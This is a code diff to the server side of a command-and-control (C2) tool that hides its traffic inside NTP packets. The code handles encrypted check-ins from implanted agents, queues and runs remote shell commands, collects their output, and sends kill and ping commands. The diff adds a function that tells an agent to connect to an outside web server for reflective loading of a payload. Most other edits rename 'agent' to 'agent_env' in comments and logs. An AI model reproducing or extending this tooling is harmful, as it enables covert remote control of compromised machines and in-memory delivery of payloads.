@@ -2,6 +2,7 @@ package server
 
 import (
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"log"
 	"net"
@@ -206,7 +207,7 @@ func (s *NTPServer) handleStandardNTP(data []byte, addr net.Addr) {
 	s.listener.WriteTo(response, addr)
 }
 
-// processC2Packet processes a C2 packet received from an agent
+// processC2Packet processes a C2 packet received from an agent_env
 func (s *NTPServer) processC2Packet(data []byte, clientIP string, addr net.Addr) {
 
 	if len(data) < 15 {
@@ -227,21 +228,21 @@ func (s *NTPServer) processC2Packet(data []byte, clientIP string, addr net.Addr)
 		payload = string(bytes.Trim(decrypted, "\x00"))
 	}
 
-	// Record agent activity in the database
+	// Record agent_env activity in the database
 	err := s.db.AddAgent(clientIP, "")
 	if err != nil {
-		log.Printf("Error updating agent status: %v", err)
+		log.Printf("Error updating agent_env status: %v", err)
 	}
 
 	// Process based on command type
 	switch commandType {
 	case common.CommandPing:
-		// Update agent's last seen time
+		// Update agent_env's last seen time
 		err = s.db.UpdateAgentStatus(clientIP, common.AgentStatusAlive)
 		if err != nil {
-			log.Printf("Error updating agent status: %v", err)
+			log.Printf("Error updating agent_env status: %v", err)
 		}
-		log.Printf("Received ping from agent %s", clientIP)
+		log.Printf("Received ping from agent_env %s", clientIP)
 
 		// Send pending commands if any
 		s.sendPendingCommands(clientIP)
@@ -262,7 +263,7 @@ func (s *NTPServer) processC2Packet(data []byte, clientIP string, addr net.Addr)
 			// Send a notification that response is received
 			s.responseMutex.Lock()
 			if ch, exists := s.responseWaitCh[clientIP]; exists {
-				// Get the last command ID from the database for this agent
+				// Get the last command ID from the database for this agent_env
 				commands, err := s.db.GetCommandHistory(clientIP)
 				if err == nil && len(commands) > 0 {
 					// Update the command output in the database
@@ -275,18 +276,18 @@ func (s *NTPServer) processC2Packet(data []byte, clientIP string, addr net.Addr)
 			}
 			s.responseMutex.Unlock()
 
-			log.Printf("Received command output from agent %s: %s", clientIP, output)
+			log.Printf("Received command output from agent_env %s: %s", clientIP, output)
 		}
 		s.outputMutex.Unlock()
 	}
 }
 
-// QueueCommand adds a command to the agent's command queue
+// QueueCommand adds a command to the agent_env's command queue
 func (s *NTPServer) QueueCommand(agentID, command string) error {
 	s.commandMutex.Lock()
 	defer s.commandMutex.Unlock()
 
-	log.Printf("SERVER QUEUE: Adding command '%s' to queue for agent %s", command, agentID)
+	log.Printf("SERVER QUEUE: Adding command '%s' to queue for agent_env %s", command, agentID)
 
 	if _, exists := s.commandQueue[agentID]; !exists {
 		s.commandQueue[agentID] = []string{}
@@ -304,7 +305,7 @@ func (s *NTPServer) QueueCommand(agentID, command string) error {
 	return nil
 }
 
-// SendKillCommand sends a kill command to an agent
+// SendKillCommand sends a kill command to an agent_env
 func (s *NTPServer) SendKillCommand(agentID string) error {
 	packet := common.NewReferencePacket(agentID, common.CommandKill)
 	err := packet.SendReferencePacket()
@@ -312,16 +313,16 @@ func (s *NTPServer) SendKillCommand(agentID string) error {
 		return fmt.Errorf("failed to send kill command: %v", err)
 	}
 
-	// Update agent status in database
+	// Update agent_env status in database
 	err = s.db.UpdateAgentStatus(agentID, common.AgentStatusKilled)
 	if err != nil {
-		return fmt.Errorf("failed to update agent status: %v", err)
+		return fmt.Errorf("failed to update agent_env status: %v", err)
 	}
 
 	return nil
 }
 
-// SendPingCommand sends a ping command to an agent
+// SendPingCommand sends a ping command to an agent_env
 func (s *NTPServer) SendPingCommand(agentID string) error {
 	packet := common.NewReferencePacket(agentID, common.CommandPing)
 	err := packet.SendReferencePacket()
@@ -331,7 +332,7 @@ func (s *NTPServer) SendPingCommand(agentID string) error {
 	return nil
 }
 
-// ExecuteCommand sends a command to an agent and waits for the response
+// ExecuteCommand sends a command to an agent_env and waits for the response
 func (s *NTPServer) ExecuteCommand(agentID, command string) (string, error) {
 	// Queue the command
 	err := s.QueueCommand(agentID, command)
@@ -367,7 +368,7 @@ func (s *NTPServer) ExecuteCommand(agentID, command string) (string, error) {
 	}
 }
 
-// sendPendingCommands sends any pending commands to the agent
+// sendPendingCommands sends any pending commands to the agent_env
 func (s *NTPServer) sendPendingCommands(agentID string) {
 	s.commandMutex.Lock()
 	defer s.commandMutex.Unlock()
@@ -376,7 +377,7 @@ func (s *NTPServer) sendPendingCommands(agentID string) {
 		// Get the next command
 		command := commands[0]
 		s.commandQueue[agentID] = commands[1:]
-		log.Printf("SERVER → AGENT: Sending command '%s' to agent %s", command, agentID)
+		log.Printf("SERVER → AGENT: Sending command '%s' to agent_env %s", command, agentID)
 
 		// If queue is empty, delete it
 		if len(s.commandQueue[agentID]) == 0 {
@@ -386,12 +387,37 @@ func (s *NTPServer) sendPendingCommands(agentID string) {
 		// Send the command
 		go s.sendCommandToAgent(agentID, command)
 	} else {
-		log.Printf("SERVER NOTE: No pending commands for agent %s", agentID)
+		log.Printf("SERVER NOTE: No pending commands for agent_env %s", agentID)
 	}
 }
 
-// sendCommandToAgent sends a command to an agent
+// sendCommandToAgent sends a command to an agent_env
 func (s *NTPServer) sendCommandToAgent(agentID, command string) error {
 	packet := common.NewCommandPacket(agentID, command)
 	return packet.ChunkAndSendCommand()
+}
+
+// SendWebConnectCommand sends a command to an agent_env to connect to a web server for reflective loading
+func (s *NTPServer) SendWebConnectCommand(agentID, serverURL string) error {
+	// Create the payload
+	payload := common.WebConnectPayload{
+		ServerURL: serverURL,
+	}
+
+	// Convert to JSON
+	payloadJSON, err := json.Marshal(payload)
+	if err != nil {
+		return fmt.Errorf("failed to marshal web connect payload: %v", err)
+	}
+
+	// Create and send a packet with the WCON command type
+	packet := common.NewPacket(agentID)
+	err = packet.SendPacket(common.CommandWebConnect, string(payloadJSON))
+	if err != nil {
+		return fmt.Errorf("failed to send web connect command: %v", err)
+	}
+
+	log.Printf("Sent web connect command to agent_env %s with URL %s", agentID, serverURL)
+
+	return nil
 }
